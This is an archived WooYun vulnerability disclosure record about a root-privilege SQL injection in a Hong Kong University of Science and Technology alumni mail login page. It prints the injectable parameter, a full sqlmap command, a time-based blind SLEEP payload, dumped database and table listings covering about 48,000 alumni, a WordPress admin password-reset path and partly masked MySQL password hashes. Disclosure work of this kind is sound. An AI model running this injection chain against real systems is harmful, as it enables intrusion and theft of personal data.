{"id": 83659, "wybug_id": "wooyun-2015-0147118", "wybug_title": "香港科技大学某邮箱服务接口ROOT权限SQL注入漏洞(影响5万名校友用户)（香港地區）", "wybug_corp": "香港科技大学", "wybug_author": "路人甲", "wybug_date": "2015-10-16 10:30", "wybug_open_date": "2015-12-04 12:40", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(hkcert香港互联网应急协调中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-16：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-10-30：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-09：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-11-19：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-04：\t细节向公众公开  简要描述： 香港科技大学某邮箱服务登陆接口存在ROOT权限的SQL注入漏洞(影响5万名校友用户)。利用同服务器的wordpress，直接使用找回密码，即可获取服务器系统权限。/wp-login.php?action=rp&key=[database_key]&login=admin 详细说明：  #1 问题服务器https://**.**.**.**/ (校友，已毕业的同学使用的邮件服务)，可登陆office365\n\n#2 注入点注入参数：username\nhttps://**.**.**.**/o_login_connect.php (POST)username=CasterPy&agreecheck=CasterPy&password=CasterPy&StuID=CasterPy\n#3 注入利用\navailable databases [7]:[*] alum[*] alumni_db[*] alumniDB2[*] information_schema[*] mysql[*] others[*] wordpress\n\n\n#~ 接近5万名校友资料\npython sqlmap.py -u \"https://**.**.**.**/o_login_connect.php\" --data \"username=CasterPy&agreecheck=CasterPy&password=CasterPy&StuID=CasterPy\" -D alumniDB2 -T tblpersonal --count---Parameter: username (POST)    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: username=CasterPy' AND (SELECT * FROM (SELECT(SLEEP(5)))RsWD) AND 'ZqVh'='ZqVh&agreecheck=CasterPy&password=CasterPy&StuID=CasterPy---[10:28:33] [INFO] the back-end DBMS is MySQLweb server operating system: Linux CentOS 6.5web application technology: PHP 5.3.3, Apache 2.2.15back-end DBMS: MySQL 5.0.12[10:28:33] [INFO] resumed: 48145Database: alumniDB2+-------------+---------+| Table       | Entries |+-------------+---------+| tblpersonal | 48145   |+-------------+---------+\n   漏洞证明：  #4 wordpress，直接使用找回密码，即可获取服务器系统权限\nhttps://**.**.**.**/blog/wp-login.php?action=rp&key=[database_key]&login=adminselect * from wp_wordpressusers\n#5 MYSQL用户表\nHost,User,Password%,alumni_db,*4E89CAE278953****************9D4B31376E872**.**.**.**,root,*ABA7DE9AAE02B****************CBD20FB1953CF73A**.**.**.**,aen,*1D82FFF07****************09C47A0E56072CFC**.**.**.**,alumni_db,<blank>**.**.**.**,alumni_db,<blank>**.**.**.**,alumni_db,42cc****************19695**.**.**.**,alumni_db,42cc****************19695**.**.**.**,alumni_db,42cc****************19695imap-1.**.**.**.**,alumni_db,42cc****************19695imap.**.**.**.**,alumni_db,<blank>imap.**.**.**.**,root,42cc****************19695ldap.**.**.**.**,alumni_db,5290eb*******96f5elocalhost,<blank>,*3A0C8F8E53****************AD45483E64CED3Elocalhost,alum,*E43E1D274****************30EF4551B86EAlocalhost,alumni_db,*ABA7DE9AAE02B****************CBD20FB1953CF73Alocalhost,root,<blank>localhost,wordpress,*4E89CAE278953****************9D4B31376E872n**.**.**.**,alumni_db,*4E89CAE278953****************9D4B31376E872**.**.**.**,aen,39c2b****************b8b1b**.**.**.**,aen,39c2b****************b8b1b**.**.**.**,aen,39c2b****************b8b1b**.**.**.**,alumni_db,42cc****************19695**.**.**.**,aen,39c2b****************b8b1b**.**.**.**,aen,51a71a****************9ad**.**.**.**,alumni_db,4d68****************6729www-1.**.**.**.**,<blank>,2e8**********20720www-1.**.**.**.**,alumni_db,2e8********20720www-1.**.**.**.**,root,42cc****************19695www-dev.**.**.**.**,<blank>,<blank>www-dev.**.**.**.**,alumni_db,42cc****************19695\n#6 mysql可直接远程连接\n\n   修复方案：  # 修复注入漏洞   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：16  确认时间：2015-10-20 12:39 厂商回复： 已聯絡相關機構處理 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2015-10-16 14:14 |    \t\thecate \t\t\t( 普通白帽子  |\t\t\t        Rank:754 漏洞数:116        | ®高级安全工程师 | WooYun认证√)\t\t \n  简要描述里面不要那么详细好吗    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 16, "Ranks": null}